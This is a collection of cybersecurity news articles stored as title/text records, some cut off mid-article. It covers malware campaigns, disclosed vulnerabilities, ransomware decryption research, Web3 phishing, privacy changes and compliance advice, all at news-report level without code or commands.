vulnerabilities was unstoppable, and its data acquisition under covert control was with little effort. The Equation Group is in a dominant position in national-level cyberspace confrontation.“\n\n\nFound this article interesting?

We have reached out to Horde for further comment, and we will update if we hear back.\nIn the interim, Horde Webmail users are advised to disable the rendering of OpenOffice attachments by editing the config/mime_drivers.php file to add the ’disable’ => true configuration option to OpenOffice mime handler.\n\n\nFound this article interesting?

Instead of retrieving the information from local disk storage, it retrieves the tokens from a web browser’s local storage.\n“This technique can be helpful to steal tokens that were generated when logging using the web browser to the Discord website, as opposed to when using the Discord app (which saves the token to the local disk storage),“ the researchers said.\nIf anything, the findings are the latest in a series of disclosures uncovering the abuse of NPM to deploy an array of payloads ranging from info-stealers up to full remote access backdoors, making it imperative that developers inspect their package dependencies to mitigate typosquatting and dependency confusion attacks.\n\n\nFound this article interesting?

'text': 'Vulnerable internet-facing Microsoft SQL (MS SQL) Servers are being targeted by threat actors as part of a new campaign to deploy the Cobalt Strike adversary simulation tool on compromised hosts.\n“Attacks that target MS SQL servers include attacks to the environment where its vulnerability has not been patched, brute forcing, and dictionary attack against poorly managed servers,“ South Korean cybersecurity company AhnLab Security Emergency Response Center (ASEC) said in a report published Monday.\n\nCobalt Strike is a commercial, full-featured penetration testing framework that allows an attacker to deploy an agent named “Beacon“ on the victim machine, granting the operator remote access to the system. Although billed as a red team threat simulation platform, cracked versions of the software have been actively used by a wide range of threat actors.\nIntrusions observed by ASEC involve the unidentified actor scanning port 1433 to check for exposed MS SQL servers to perform brute force or dictionary attacks against the system administrator account, i.e., “sa“ account, to attempt a log in.\n\nThat’s not to say that servers not left accessible over the internet aren’t vulnerable, what with the threat actor behind LemonDuck malware scanning the same port to laterally move across the network.\n“Managing admin account credentials so that they’re vulnerable to brute forcing and dictionary attacks as above or failing to change the credentials periodically may make the MS-SQL server the main target of attackers,“ the researchers said.\nUpon successfully gaining a foothold, the next phase of the attack works by spawning a Windows command shell via the MS SQL “sqlservr.exe“ process to download the next-stage payload that houses the encoded Cobalt Strike binary on to the system.\n\nThe attacks ultimately culminate with the malware decoding the Cobalt Strike executable, followed by injecting it into the legitimate Microsoft Build Engine (MSBuild) process, which has been previously abused by malicious actors to filelessly deliver remote access trojans and password-stealing malware on targeted Windows systems.\nFurthermore, the Cobalt Strike that’s executed in MSBuild.exe comes with additional configurations to evade detection of security software. It achieves this by loading “wwanmm.dll,“ a Windows library for WWan Media Manager, then writing and running the Beacon in the memory area of the DLL.\n“As the beacon that receives the attacker’s command and performs the malicious behavior does not exist in a suspicious memory area and instead operates in the normal module wwanmm.dll, it can bypass memory-based detection,“ the researchers noted.\n\n\nFound this article interesting?

'text': 'A new Android banking trojan with over 50,000 installations has been observed distributed via the official Google Play Store with the goal of targeting 56 European banks and carrying out harvesting sensitive information from compromised devices.\nDubbed Xenomorph by Dutch security firm ThreatFabric, the in-development malware is said to share overlaps with another banking trojan tracked under the moniker Alien while also being “radically different“ from its predecessor in terms of the functionalities offered.\n“Despite being a work-in-progress, Xenomorph is already sporting effective overlays and being actively distributed on official app stores,“ ThreatFabric’s founder and CEO, Han Sahin, said. “In addition, it features a very detailed and modular engine to abuse accessibility services, which in the future could power very advanced capabilities, like ATS.“\n\nAlien, a remote access trojan (RAT) with notification sniffing and authenticator-based 2FA theft features, emerged shortly after the demise of the infamous Cerberus malware in August 2020. Since then, other forks of Cerberus have been spotted in the wild, including ERMAC in September 2021.\nXenomorph, like Alien and ERMAC, is yet another example of an Android banking trojan that’s focused on circumventing Google Play Store’s security protections by masquerading as productivity apps such as “Fast Cleaner“ to trick unaware victims into installing the malware.\n\nIt’s worth noting that a fitness training dropper app with over 10,000 installations — dubbed GymDrop — was found delivering the Alien banking trojan payload in November by masking it as a “new package of workout exercises.“\nFast Cleaner, which has the package name “vizeeva.fast.cleaner“ and continues to available on the app store, has been most popular in Portugal and Spain, data from mobile app market intelligence firm Sensor Tower reveals, with the app making its first appearance in the Play Store towards the end of January 2022.\nWhat’s more, reviews for the app from users come with warnings that “this app has malware“ and that it “ask[s] for an update to be confirmed continuously.“ Another user said: “It puts malware on the device and apart from that it has a self-protection system so that you cannot uninstall it.“\n\nAlso put to use by Xenomorph is the time-tested tactic of prompting the victims to grant it Accessibility Service privileges and abuse the permissions to conduct overlay attacks, wherein the malware injects rogue login screens atop targeted apps from Spain, Portugal, Italy, and Belgium to siphon credentials and other personal information.\nAdditionally, it’s equipped with a notification interception feature to extract two-factor authentication tokens received via SMS, and get the list of installed apps, the results of which are exfiltrated to a remote command-and-control server.\n“The surfacing of Xenomorph shows, once again, that threat actors are focusing their attention on landing applications on official markets,“ the researchers said. “Modern Banking malware is evolving at a very fast rate, and criminals are starting to adopt more refined development practices to support future updates.“\n\n\nFound this article interesting?

{'title': 'Iranian State Broadcaster IRIB Hit by Destructive Wiper Malware',
'text': 'An investigation into the cyberattack targeting Iranian national media corporation, Islamic Republic of Iran Broadcasting (IRIB), in late January 2022 revealed the deployment of a wiper malware and other custom implants, as the country’s national infrastructure continues to face a wave of attacks aimed at inflicting serious damage.\n“This indicates that the attackers’ aim was also to disrupt the state’s broadcasting networks, with the damage to the TV and radio networks possibly more serious than officially reported,“ Tel Aviv-based cybersecurity firm Check Point said in a report published last week.\nThe 10-second attack, which took place on January 27, involved the breach of state broadcaster IRIB to air pictures of Mujahedin-e-Khalq Organization (MKO) leaders Maryam and Massoud Rajavi alongside a call for the assassination of the Supreme Leader Ayatollah Ali Khamenei.\n\n“This is an extremely complex attack and only the owners of this technology could exploit and damage the backdoors and features that are installed on the systems,“ Deputy IRIB chief Ali Dadi was quoted as saying to state TV channel IRINN.\nAlso deployed during the course of the hack were custom-made malware capable of taking screenshots of the victims’ screens as well as backdoors, batch scripts, and configuration files used to install and configure the malicious executables.\n\nCheck Point said it didn’t have enough evidence to make a formal attribution to a specific threat actor, and it’s currently not known how the attackers gained initial access to the targeted networks. Artifacts uncovered so far include files responsible for –\nEstablishing backdoors and their persistence,Launching the “malicious“ video and audio files, andInstalling the wiper malware in an attempt to disrupt operations in the hacked networks.\nBehind the scenes, the attack involved interrupting the video stream using a batch script to delete the executable associated with TFI Arista Playout Server, a broadcasting software used by IRIB, and play the video file (“TSE_90E11.mp4“) in a loop.\n\nThe intrusion also paved the way for the installation of a wiper whose main purpose is to corrupt the files stored in the computer, not to mention erase the master boot record (MBR), clear Windows Event Logs, delete backups, kill processes, and change users’ passwords.\nFurthermore, the threat actor leveraged four backdoors in the attack: WinScreeny, HttpCallbackService, HttpService and ServerLaunch, a dropper launched with HttpService. Taken together, the different pieces of malware enabled the adversary to capture screenshots, receive commands from a remote server, and carry out other malicious activities.\n“On one hand, the attackers managed to pull off a complicated operation to bypass security systems and network segmentation, penetrate the broadcaster’s networks, produce and run the malicious tools that heavily rely on internal knowledge of the broadcasting software used by victims, all while staying under the radar during the reconnaissance and initial intrusion stages,“ the researchers said.\n“On the other hand, the attackers’ tools are of relatively low quality and sophistication, and are launched by clumsy and sometimes buggy 3-line batch scripts. This might support the theory that the attackers might have had help from inside the IRIB, or indicate a yet unknown collaboration between different groups with different skills.“\n\n\nFound this article interesting?

{'title': 'A Free Solution to Protect Your Business from 6 Biggest Cyber Threats in 2022',
'text': 'For the last few years, the cybersecurity threat landscape has gotten progressively more complex and dangerous. The online world is now rife with data thieves, extortionists, and even state actors looking to exploit vulnerabilities in businesses’ digital defenses. \nAnd unfortunately — the bad guys have the upper hand at the moment. Part of the reason for that is the fallout from the rapid digitization made necessary by the COVID-19 pandemic.\nAccording to research on the subject, more than half of businesses have yet to mitigate the risks created by that digitization. And when you add a persistent shortage of cybersecurity workers to that fact, you have the makings of a scary situation.\nBut businesses aren’t helpless. There are plenty of things they can do to augment their defenses as they look to mitigate cyber risks. And best of all, some of those options won’t cost them a thing.\nA great example of that is the open-source security platform Wazuh. It offers businesses a free solution to the following top six cyber threats — and then some.\nRansomware and Malware\nOf all of the digital threats businesses now face, there’s one that most experts agree is the most pressing. It’s the threat of ransomware. Ransomware is a type of malware designed to hold business systems and data hostage using sophisticated encryption technology. \nOnce it gets into a business network, it will encrypt valuable data and demand payment to return access to that data to the business.\n\nThe trouble is — there’s never any guarantee that a payment will result in the data getting released. And 80% of businesses that do pay to get their data back end up getting retargeted for a second attack. So, the only surefire way to deal with ransomware is to avoid it in the first place. And that’s the first thing Wazuh can help with.\nThere are a few ways that Wazuh accomplishes this on the machines it’s running on. First, it uses a “Scanless Vulnerability Detection“ module that works with a CVE (Common Vulnerabilities and Exposures) database to search for vulnerabilities in the software and hardware. Then, it looks for misconfigurations that could allow malicious software to propagate. And finally, it conducts file system surveillance using the “File integrity monitoring“ feature to look for the telltale signs of a ransomware attack in real-time.\nNetwork-Based Intrusions\nOne of the reasons that threats like ransomware, backdoor and malware are so dangerous is their ability to spread within a compromised business network. That means a security flaw on a single machine could end up leading to a company-wide cyber attack. And the only way to spot something like that is to monitor network traffic to look for unusual activity.\nWazuh does this by integrating with another industry-leading open-source solution called Suricata. It’s a sophisticated intrusion detection, prevention, and network security monitoring platform that can detect cyber-attacks and halt them in their tracks. And with the addition of another free component — OwlH — network managers can see a complete visualization of network utilization to spot potential threats before they can do real damage.\nVulnerable and Outdated Software\nBelieve it or not, the majority of cyber-attacks exploit vulnerabilities that software vendors are already aware of. The reason they can do that is the fact that computer users — and particularly business users — don’t do a very good job of keeping their software up to date. And just by doing that, businesses can gain an instant upgrade to their cyber defenses.\nWazuh helps them with that by performing network-wide vulnerability scans that can identify known security flaws. And through a single interface, it identifies missing security patches that will fix the problems when available. That makes it easier for administrators to patch known vulnerabilities and keep track of those for which patches aren’t yet available.\nDDoS Attacks\nAnother common cyber threat involves the use of internet traffic to paralyze a targeted system or network. \nIt’s known as a distributed denial of service (DDoS) attack, and while not typically destructive, it can lead to hours of downtime for a target. Cybercriminals carry out such attacks by harnessing the power of thousands of compromised computers and devices to direct a wave of meaningless internet traffic toward their target. \n\nEventually, the affected system runs out of resources to deal with it and is effectively knocked offline.\nThere are built-in out-of-the-box rules in Wazuh that can identify brute-force and DDoS attacks by correlating multiple authentication failure events. In this way, the platform can help network administrators to short-circuit ongoing DDoS attacks and stop brute-force hack attempts aimed at open SSH and RDP ports.\nData Leaks\nOne of the biggest cyber threats businesses have to deal with every day is the chance that their proprietary or other sensitive data will fall into the wrong hands. \nSometimes, it happens when an unauthorized user gains access to a protected system and exfiltrates data. And other times it happens through the carelessness — or malice — of an employee or other insider.\nIn order to protect against the former, Wazuh has a range of real-time monitoring features that can detect unauthorized access via custom rules, alerting managers when malicious commands are executed. And to guard against the latter, it can monitor employees’ use of external storage devices like USB drives and the like to help administrators enforce the business’s data security policy. It can even run audits of any command-line use by authorized users, to look for attempts at bypassing GUI-based restrictions on data access.\nRegulatory Compliance\nCybercriminals aren’t the only digital threat that businesses have to deal with. They may also face repercussions from failing to abide by regulatory standards they’re subject to. And as the number of those standards continues to grow, so too does the burden businesses face in guaranteeing their compliance.\nThe good news is that Wazuh is built with compliance in mind. Its built-in detection and logging rules are mapped to various major compliance requirements. That means it can automatically attach compliance information to the alerts it generates.\nThe regulatory frameworks it supports out of the box include:\nTrust Services Criteria (TSC SOC2)Payment Card Industry Data Security Standard (PCI DSS)NIST Special Publication 800-53 (NIST 800-53)General Data Protection Regulation (GDPR)Good Practice Guide 13 (GPG13)Health Insurance Portability and Accountability Act (HIPAA)\nThose features aid administrators in the complex task of compliance and in fulfilling their reporting requirements as necessary.\nThe Bottom Line\nThe cyber threat landscape is continuing to evolve and presents an ever greater security challenge to businesses. And for that reason, they must use all of the tools at their disposal to defend themselves.\nFortunately, Wazuh offers businesses a sophisticated security platform without the need for massive technology investment. And given its versatility — it should be a go-to solution for any business racing to meet the challenge of modern cybersecurity.\nIf you haven’t tried it yet, you should. Wazuh is a fully open-source solution that is free to download and easy to use. There is also extensive documentation describing its features, capabilities and usage.\n\n\nFound this article interesting?

{'title': 'Hackers Exploiting Infected Android Devices to Register Disposable Accounts',
'text': 'An analysis of SMS phone-verified account (PVA) services has led to the discovery of a rogue platform built atop a botnet involving thousands of infected Android phones, once again underscoring the flaws with relying on SMS for account validation.\nSMS PVA services, since gaining prevalence in 2018, provide users with alternative mobile numbers that can be used to register for other online services and platforms, and help bypass SMS-based authentication and single sign-on (SSO) mechanisms put in place to verify new accounts.\n“This type of service can be used by malicious actors to register disposable accounts in bulk or create phone-verified accounts for conducting fraud and other criminal activities,“ Trend Micro researchers said in a report published last week.\n\nTelemetry data gathered by the company shows that most of the infections are located in Indonesia (47,357), followed by Russia (16,157), Thailand (11,196), India (8,109), and France (5,548), Peru (4,915), Morocco (4,822), South Africa (4,413), Ukraine (2,920), and Malaysia (2,779).\nA majority of affected devices are budget Android phones assembled by original equipment manufacturers such as Lava, ZTE, Mione, Meizu, Huawei, Oppo, and HTC.\nOne particular service, dubbed smspva[.]net, comprises of Android phones infected with SMS-intercepting malware, which the researchers suspect could have happened in either of two ways: through malware downloaded accidentally by the users or through malicious software preloaded into the devices during manufacturing, implying a supply-chain compromise.\n\nThe underground VPA service advertises “bulk virtual phone numbers“ for use on various platforms via an API, in addition to claiming to be in possession of phone numbers spanning across more than 100 countries.\nThe Guerrilla malware (“plug.dex“), for its part, is engineered to parse SMS messages received on the affected Android phone, check them against specific search patterns received from a remote server, and then exfiltrate the messages that match those expressions back to the server.\n\n“The malware remains low-profile, collecting only the text messages that match the requested application so that it can covertly continue this activity for long periods,“ the researchers said. “If the SMS PVA service allows its customers to access all messages on the infected phones, the owners would quickly notice the problem.“\nWith online portals often authenticating new accounts by cross-checking the location (i.e., IP address) of the users against their phone numbers during registration, SMS PVA services get around this restriction by making use of residential proxies and VPNs to connect to the desired platform.\n\nWhat’s more, these services only sell the one-time confirmation codes needed at the time of account registration, with the botnet operator using the army of compromised devices to receive, examine, and report the SMS verification codes without the owners’ knowledge and consent.\nIn other words, the botnet facilitates easy access to thousands of mobile numbers in different countries, effectively enabling the actors to register new accounts en masse and use them for various scams or even participate in coordinated inauthentic user behavior.\n“The presence of SMS PVA services makes another dent on the integrity of SMS verification as the primary means of account validation,“ the researchers said.\n“The scale to which SMS PVA is able to supply mobile numbers means that the usual methods to ensure validity — such as blocklisting mobile numbers previously tied to account abuse or identifying numbers belonging to VoIP services or SMS gateways — won’t be enough.“\n\n\nFound this article interesting?

{'title': 'Master Key for Hive Ransomware Retrieved Using a Flaw in its Encryption Algorithm',
'text': 'Researchers have detailed what they call the “first successful attempt“ at decrypting data infected with Hive ransomware without relying on the private key used to lock access to the content.\n“We were able to recover the master key for generating the file encryption key without the attacker’s private key, by using a cryptographic vulnerability identified through analysis,“ a group of academics from South Korea’s Kookmin University said in a new paper dissecting its encryption process.\nHive, like other cybercriminal groups, operates a ransomware-as-a-service that uses different mechanisms to compromise business networks, exfiltrate data, and encrypt data on the networks, and attempts to collect a ransom in exchange for access to the decryption software.\n\nIt was first observed in June 2021, when it struck a company called Altus Group. Hive leverages a variety of initial compromise methods, including vulnerable RDP servers, compromised VPN credentials, as well as phishing emails with malicious attachments.\nThe group also practices the increasingly lucrative scheme of double extortion, wherein the actors go beyond just encryption by also exfiltrating sensitive victim data and threatening to leak the information on their Tor site, “HiveLeaks.“\n\nAs of October 16, 2021, the Hive RaaS program has victimized at least 355 companies, with the group securing the eighth spot among the top 10 ransomware strains by revenue in 2021, according to blockchain analytics company Chainalysis.\nThe malicious activities associated with the group have also prompted the U.S. Federal Bureau of Investigation (FBI) to release a Flash report detailing the attacks’ modus operandi, noting how the ransomware terminates processes related to backups, anti-virus, and file copying to facilitate encryption.\nThe cryptographic vulnerability identified by the researchers concerns the mechanism by which the master keys are generated and stored, with the ransomware strain only encrypting select portions of the file as opposed to the entire contents using two keystreams derived from the master key.\n\n“For each file encryption process, two keystreams from the master key are needed,“ the researchers explained. “Two keystreams are created by selecting two random offsets from the master key and extracting 0x100000 bytes (1MiB) and 0x400 bytes (1KiB) from the selected offset, respectively.“\nThe encryption keystream, which is created from an XOR operation of the two keystreams, is then XORed with the data in alternate blocks to generate the encrypted file. But this technique also makes it possible to guess the keystreams and restore the master key, in turn enabling the decode of encrypted files sans the attacker’s private key.\nThe researchers said that they were able to weaponize the flaw to devise a method to reliably recover more than 95% of the keys employed during encryption.\n“The master key recovered 92% succeeded in decrypting approximately 72% of the files, the master key restored 96% succeeded in decrypting approximately 82% of the files, and the master key restored 98% succeeded in decrypting approximately 98% of the files,“ the researchers said.\n\n\nFound this article interesting?

The ill-gotten currencies account for crypto-native crimes such as darknet market sales or ransomware attacks in which profits are in digital instead of fiat currencies.\nFurthermore, 2021 witnessed a marked increase in criminal balances in 2021, with malicious parties holding $11 billion worth of funds with known illicit sources at the end of the year, compared to just $3 billion at the end of 2020.\nOn top of that, the North Korean advanced persistent threat (APT) known as Lazarus Group launched at least seven attacks on cryptocurrency platforms that extracted roughly $400 million worth of digital assets in 2021.\n\nThat’s not all. Russia-linked cybercriminals also set the pace for ransomware and cryptocurrency-based money laundering activity last year, raking in nearly 74% of ransom payments in 2021 — over $400 million worth of cryptocurrency – through strains “highly likely“ affiliated with the country.\n“The NCET will play a pivotal role in ensuring that as the technology surrounding digital assets grows and evolves, the department in turn accelerates and expands its efforts to combat their illicit abuse by criminals of all kinds,“ Director Choi said in a statement.\n\n\nFound this article interesting?

'text': 'Microsoft has warned of emerging threats in the Web3 landscape, including “ice phishing“ campaigns, as a surge in adoption of blockchain and DeFi technologies emphasizes the need to build security into the decentralized web while it’s still in its early stages.\nThe company’s Microsoft 365 Defender Research Team called out various new avenues through which malicious actors may attempt to trick cryptocurrency users into giving up their private cryptographic keys and carry out unauthorized fund transfers.\n\n“One aspect that the immutable and public blockchain enables is complete transparency, so an attack can be observed and studied after it occurred,“ Christian Seifert, principal research manager at Microsoft’s Security and Compliance group, said. “It also allows assessment of the financial impact of attacks, which is challenging in traditional Web2 phishing attacks.“\nThe theft of the keys could be carried out in several ways, including impersonating wallet software, deploying malware on victims’ devices, typosquatting legitimate smart contract front ends, and minting rogue digital tokens for Airdrop scams.\n\nAnother technique involves what Microsoft calls “ice phishing.“ Rather than stealing a user’s private keys, the method works by deceiving the target into “signing a transaction that delegates approval of the user’s tokens to the attacker.“\n\n“Once the approval transaction has been signed, submitted, and mined, the spender can access the funds,“ Seifert elaborated. “In case of an ’ice phishing’ attack, the attacker can accumulate approvals over a period of time and then drain all [the] victim’s wallets quickly.“\nOne such instance of ice phishing came to light in early December 2021 with the high-profile hack of Ethereum-based DeFi platform BadgerDAO, wherein a maliciously injected snippet using a compromised API key enabled the adversary to siphon $121 million in funds.\n\n“The attacker deployed the worker script via a compromised API key that was created without the knowledge or authorization of Badger engineers,“ BadgerDAO said. “The attacker(s) used this API access to periodically inject malicious code into the Badger application such that it only affected a subset of the user base.“\nThe script was programmed such that it would intercept Web3 transactions from wallets over a certain balance and insert a request to transfer the victim’s tokens to an address chosen by the attackers.\nTo mitigate threats affecting the blockchain technology, Microsoft is recommending users to review and audit the smart contracts for adequate incident response or emergency capabilities and periodically reassess and revoke token allowances.\n\n\nFound this article interesting?

'text': 'Multiple security vulnerabilities have been disclosed in Canonical’s Snap software packaging and deployment system, the most critical of which can be exploited to escalate privilege to gain root privileges.\nSnaps are self-contained application packages that are designed to work on operating systems that use the Linux kernel and can be installed using a tool called snapd.\n\nTracked as CVE-2021-44731, the issue concerns a privilege escalation flaw in the snap-confine function, a program used internally by snapd to construct the execution environment for snap applications. The shortcoming is rated 7.8 on the CVSS scoring system.\n\n“Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host,“ Bharat Jogi, director of vulnerability and threat research at Qualys, said, adding the weakness could be abused to “obtain full root privileges on default installations of Ubuntu.“\nRed Hat, in an independent advisory, described the issue as a “race condition“ in the snap-confine component.\n“A race condition in snap-confine exists when preparing a private mount namespace for a snap,“ the company noted. “This could allow a local attacker to gain root privileges by bind-mounting their own contents inside the snap’s private mount namespace and causing snap-confine to execute arbitrary code and hence privilege escalation.“\n\nAdditionally discovered by the cybersecurity firm are six other flaws –\nCVE-2021-3995 – Unauthorized unmount in util-linux’s libmountCVE-2021-3996 – Unauthorized unmount in util-linux’s libmountCVE-2021-3997 – Uncontrolled recursion in systemd’s systemd-tmpfilesCVE-2021-3998 – Unexpected return value from glibc’s realpath()CVE-2021-3999 – Off-by-one buffer overflow/underflow in glibc’s getcwd()CVE-2021-44730 – Hardlink attack in snap-confine’s sc_open_snapd_tool()\nThe vulnerability was reported to the Ubuntu security team on October 27, 2021, following which patches were released on February 17 as part of a coordinated disclosure process.\nQualys also pointed out that while the flaw isn’t remotely exploitable, an attacker that has logged in as an unprivileged user can “quickly“ exploit the bug to gain root permissions, necessitating that the patches are applied as soon as possible to mitigate potential threats.\n\n\nFound this article interesting?

{'title': '4 Cloud Data Security Best Practices All Businesses Should Follow Today',
'text': 'These days, businesses all around the world have come to depend on cloud platforms for a variety of mission-critical workflows. They keep their CRM data in the cloud. They process their payrolls in the cloud. They even manage their HR processes through the cloud. And all of that means they’re trusting the bulk of their privileged business data to those cloud providers, too.\nAnd while most major cloud providers do a decent job of keeping data secure, the majority of business users take an upload-it-and-forget-it approach to their data security needs. And that — needless to say — is dangerous.\nIn reality, cloud providers can only protect a business’s data if the business does its part by adhering to some cloud security best practices. And fortunately, they’re not that complicated. Here are the four most important cloud security best practices businesses should build into their cloud operations right away.\nNever Skip Selection Due Diligence\nThe first cloud security best practice for businesses to follow is to always conduct adequate due diligence when choosing cloud vendors to work with. It’s important, of course, to investigate each provider’s reputation. But it’s also just as important to scrutinize their security practices and the specifics of their user agreement.\nAt a minimum, businesses should find out how and where their data will be stored by the provider, as well as the details around how the vendor works to keep unauthorized users out.\nAnd, they must also check to see if the vendor offers any guarantees or technical assistance in the event of a data breach. And if any of that information is either unclear or unsatisfactory, it’s best to move on to a more reputable provider.\nCreate a Bulletproof Access Management Strategy\nThe next cloud security best practice is to devise and implement a unified access management strategy. One of the big security issues that cloud-dependent businesses face is that they rely on fragmented authentication and access management systems. And that often leads to poor credential management and permissions creep.\nTo put a stop to those issues, it’s advisable to unify their authentication and access management through a single sign-on (SSO) provider. And at a minimum, all accounts — regardless of platform — should require multifactor authentication and undergo frequent access rights reviews. And lastly, it’s important to take steps to prevent identity theft. This problem is on the risel, so be sure to take proactive steps in that regard, before anything bad even happens.\nElevate User Education and Deploy Malware Protection\nAt the end of the day, the ultimate responsibility for data security rests with those trusted to access that data. And without proper education and training, most users are just an accidentally opened spam email away from enabling a data breach. That’s why it’s an essential best practice of cloud security to insist on proper training for all users before they’re given access to any critical business systems or data.\nAnd as a second line of defense, it’s also best to deploy a malware and threat protection solution that’s designed for cloud deployments. Such solutions offer protection in the form of uploaded data scanning and proactive threat defense to keep unauthorized users from getting into cloud-hosted data. And while they’re no substitute for a well-trained and security-aware user base, they make for an excellent insurance policy against inadvertent human error.\nPractice Data Minimization\nLast but not least, it’s a good idea for businesses to take steps to minimize the data they’re entrusting to their cloud providers. After all, you don’t need to protect data that’s never uploaded in the first place. The idea is to refine business processes to collect only the data required to make them work.\nFor example, managing a deal pipeline in the cloud will require the storage of some personally identifiable client data. But it doesn’t require any hard financial data or anything much beyond contact information to be effective. So, it’s best to codify that and make sure that all users avoid adding anything unnecessary.\nThat goes a long way toward building a policy of data minimization that reduces the business’s vulnerability in the cloud. And, depending on the type of data involved, it may also be a regulatory requirement that businesses must observe. In any case, reducing the data stored on various cloud platforms simplifies everything about data security — from management, to access control, to curation — and should always be at the core of everything businesses do online.\nThe Bottom Line\nAt the end of the day, cloud platforms and apps now play a critical role in business operations for organizations of all sizes. And they’re not going anywhere. But with the online threat environment continuing to get more challenging each day, it falls to businesses to use those platforms in ways that minimize risks and avoid taking chances concerning data security. Failing to do so has doomed many a business — and will continue to do so. But by taking data security seriously, beginning with the four best practices laid out above, today’s businesses can avoid that fate.\n\n\nFound this article interesting?

{'title': 'Google Bringing Privacy Sandbox to Android to Limit Sharing of User Data',
'text': 'Google on Wednesday announced plans to bring its Privacy Sandbox initiatives to Android in a bid to expand its privacy-focused, but also less disruptive, advertising technology beyond the desktop web.\nTo that end, the internet giant said it will work towards building solutions that prevent cross-app tracking à la Apple’s App Tracking Transparency (ATT) framework, effectively limiting sharing of user data with third-parties as well as eliminating identifiers such as advertising IDs on mobile devices.\n“The Privacy Sandbox on Android builds on our existing efforts on the web, providing a clear path forward to improve user privacy without putting access to free content and services at risk,“ Anthony Chavez, vice president of product management for Android security and privacy, said.\nPrivacy Sandbox, launched in 2019, is Google’s umbrella term for a set of technologies that will phase out third-party cookies and curb covert tracking, like fingerprinting, by reducing the amount of information sites can access in order to keep tabs on users’ online activities.\nBut unlike Apple’s ATT, which requires all apps to ask for users’ explicit consent before tracking them across other apps and websites, the new multi-year project aims to strike a balance by offering privacy-preserving ways to enable mobile advertising while simultaneously adopting restrictions to curtail tracking between different apps.\n\nApple’s anti-tracking changes on iOS and iPadOS are expected to cost ad-driven companies like Meta Platforms $10 billion in revenue in 2022, with the social media firm calling it a “pretty significant headwind for our business.“ Google also dubbed ATT as a “blunt“ approach that can be ineffective and could “lead to worse outcomes for user privacy and developer businesses.“\nThat said, the Alphabet-owned company said it intends to support the existing identifier-based ads platform for at least two more years and give the industry substantial notice prior to any future changes. A beta version is scheduled for release by the end of the year.\nThe development comes as Google last year tightened its policies surrounding the use of advertising ID, rendering it unavailable to developers should users opt out of receiving interest-based ads or ads personalization. The change is expected to roll out to all Android phones on April 1, 2022 via a Google Play Services update.\nThe advertising identifier is a unique, user-resettable string of letters and digits that’s connected to an individual device, permitting ad-tech companies to infer users’ interests from their online behaviors and activities across different apps.\nIn addition, Google will require that apps declare the “com.google.android.gms.permission.AD_ID“ permission to query the advertising identifier on devices running versions Android 12 and above, at the same putting it out of reach of apps that target children.\nThe new system is also expected to include a FLEDGE API for Android that tracks users’ behavior inside an app and slots them into groups for “custom audience targeting.“ Furthermore, Google is debuting what it calls the SDK Runtime to “reduce undisclosed access and sharing“ of a user’s app data and usage by third-party SDKs.\nThe ad-tech overhaul arrives a week after the U.K. Competition and Markets Authority (CMA) gave its stamp of approval to the company’s efforts to develop the Privacy Sandbox initiative across the web and apps on Android and design it in a manner that addresses competition concerns and benefits consumers.\nGoogle’s sweeping change for app-tracking replacement on mobile is similar to its proposal to drop third-party cookies on the web, in a shift mirroring that of Apple Safari and Mozilla Firefox, both of which have blocked third-party cookies by default in recent years.\n\nBut the move attracted significant opposition from regulators and privacy advocates alike for being too opaque, prompting the company to delay the change to late 2023 and discontinue its controversial FLoC-based approach for interest-based advertising in favor of a new Topics API.\n“With the Topics API proposal, the browser would infer topics for a user based on their browsing activity during a period of time known as an epoch, currently proposed to be one week,“ the company said. “The topic selected for each epoch would be randomly selected from the user’s top five topics for that time period.“\nThus when users visit a site that supports the Topics API for ad purposes, the browser will share a rotating subset of three topics they are interested in — one for each of the three last weeks — selected randomly from the pool of top five topics, which can then be shared by the website with its advertising partners to serve relevant ads.\nTopics also addresses one of the biggest issues with FLoC by not only preventing ad providers from knowing which sites users have browsed, but also from leaking more information than the current third-party cookie system by enabling marketers identify users through other means like IP address and log their cohort participation over time.\nGoogle said its goal with Privacy Sandbox on Android is to create “privacy enhancing advertising solutions, where users know their information is protected, and developers and businesses have the tools to succeed on mobile.“\n\n\nFound this article interesting?

{'title': 'Getting Your SOC 2 Compliance as a SaaS Company',
'text': 'If you haven’t heard of the term, you will soon enough. SOC 2, meaning System and Organization Controls 2, is an auditing procedure developed by the American Institute of CPAs (AICPA). Having SOC 2 compliance means you have implemented organizational controls and practices that provide assurance for the safeguarding and security of client data. In other words, you have to show (e.g., document and demonstrate) that you are acting in good faith with other people’s information. In its simplest definition, it’s a report card from an auditor. \nAt Rewind, before SOC 2, we had some processes in place, such as change management procedures for when emergency fixes need to be released to production quickly. But after beginning our SOC 2 journey we realized that we did not have a great way to track the reasoning behind a required emergency change, and this was required for our SOC 2 audit. So we worked with our auditor to set up a continuous auditing system for these requests, providing a long-term solution and a massive procedural improvement, offering this solution to other companies in our position. Achieving SOC 2 compliance signals to a market, that you are willing to provide assurance in the form of a third-party audit report that you will protect customer information. Information your business relies on. \nWhy Have SOC 2 at All? \nIn short, more data is collected by more organizations today, than at any point in history. As a whole, private and public sector groups are becoming more conscious about how their proprietary data is handled by other parties. For highly regulated industries such as finance, healthcare, or publicly traded companies, SOC 2 has essentially become a cost of doing business. For any SaaS companies that want to “grow up“ and sell to big brands, the question “Do you have your SOC2?“ will be one of the first things your sales team gets asked.\nSOC 2 reports also give companies a leg up in providing assurance to customers in today’s cybersecurity landscape. The volume of cyberattacks is increasing every year. A breach can trigger fines, damage a company’s reputation, cause an exodus of customers, and much more. SOC 2 compliance goes a long way in mitigating losses from these scenarios by providing assurance that you have key processes in place. A compliant business is more likely to respond to a breach quickly, thus limiting its impact.\nGetting SOC2 the Swift and Smart Way \nBefore I joined Rewind, and similarly for most growing SaaS companies, SOC 2 seemed like an intimidating task to achieve. We had processes in place, but we had work to do to formalize them to be SOC 2 compliant and audit ready. The sales team was also consistently getting asked about Rewind and our plans for SOC 2 compliance because our customers wanted that assurance, and getting SOC 2 became a priority. The next step is understanding your company’s SOC2 goals, priorities, and identifying what steps need to be taken to become compliant. \nI’ve spent my entire career as an Information Security Professional with a focus on governance, risk and compliance. Much of this is second nature to me. For newcomers it can be a daunting and overwhelming process. So here is a quick framework to help you get prepared for the road ahead.\n1 — Choosing your scope\nThe first step is to decide on the scope of your audit, what service or product will be the focus,\nand what Trust Service Principles you want to be audited. For example, Security is a mandatory principle, but you can also include confidentiality, availability, processing integrity, or privacy principles. \nHere’s an easy way to think about this: the service you provide to your customers, can determine what Trust Service Principles to focus on. For example, if your company processes financial data, “processing integrity“ may be an important principle to showcase. An 